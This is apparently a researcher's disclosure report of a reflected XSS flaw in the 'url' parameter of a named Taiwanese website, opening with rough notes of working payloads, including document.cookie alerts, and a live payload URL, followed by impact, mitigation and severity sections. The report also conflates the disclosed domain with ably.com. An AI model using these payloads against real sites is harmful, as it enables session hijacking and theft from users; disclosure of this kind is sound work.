site: http://www.ably.com.tw/pdt/vpics.asp?url=%3Cimg%20src/onerror=prompt(dcoument.cookie)%3E
payload confirmed xss

<img src/onerror=prompt(8)>


>
<a onmouseover="alert(document.cookie)">xxs link</a>

<img src=foo.png onerror=alert(/xssed/) />




https://ably.com/disclosure



### XSS Vulnerability Report

**Title:** Reflected XSS Vulnerability in `http://ably.com./`

**Summary:** A reflected Cross-Site Scripting (XSS) vulnerability exists in the `http://ably.com.tw` website. The vulnerability allows an attacker to inject arbitrary JavaScript code into the web page, which is executed in the context of the victim’s browser. This could lead to session hijacking, phishing attacks, or other malicious activities.

**Vulnerability Details:**

- **URL Affected:** `http://www.ably.com.tw/pdt/vpics.asp?url=`
- **Parameter Affected:** `url`
- **Vulnerability Type:** Reflected XSS

**Steps to Reproduce:**

1. **Navigate to the following URL:**
    
    
    `http://www.ably.com.tw/pdt/vpics.asp?url=%3Cimg%20src=foo.png%20onerror=alert(/xssed/)%20/%3E`
    
2. **Observe the following behavior:**
    
    - A JavaScript `alert` with the text "xssed" will be displayed in the browser, confirming that the input is being executed as script code.
  3. Payload used
      <img src=foo.png onerror=alert(/xssed/) />


**Impact:**

- **Session Hijacking:** The attacker can steal session cookies or tokens.
- **Phishing:** The attacker can redirect the user to a malicious website.
- **Content Modification:** The attacker can modify the content of the page to mislead users.
- **Data Theft:** The attacker can steal sensitive information from the victim.

**Mitigation Recommendations:**

1. **Sanitize User Input:**
    
    - Ensure that all user inputs are properly sanitized before processing. Remove or escape characters that could be interpreted as HTML or JavaScript.
2. **Encode Output:**
    
    - Encode all user-supplied data before rendering it in the browser. Use HTML entity encoding for special characters.
3. **Implement Content Security Policy (CSP):**
    
    - Use a CSP to limit the sources from which scripts can be executed.
4. **Use Security Headers:**
    
    - Ensure that HTTP headers like `X-Content-Type-Options`, `X-XSS-Protection`, and `Strict-Transport-Security (HSTS)` are correctly configured.

**Proof of Concept (PoC):**

Include a screenshot or video of the XSS alert, showing the vulnerability in action.

**Severity:**  High  

**References:**

- OWASP XSS Prevention Cheat Sheet
- CSP Evaluator Tool

**Reported By:** Rohit Tiwari

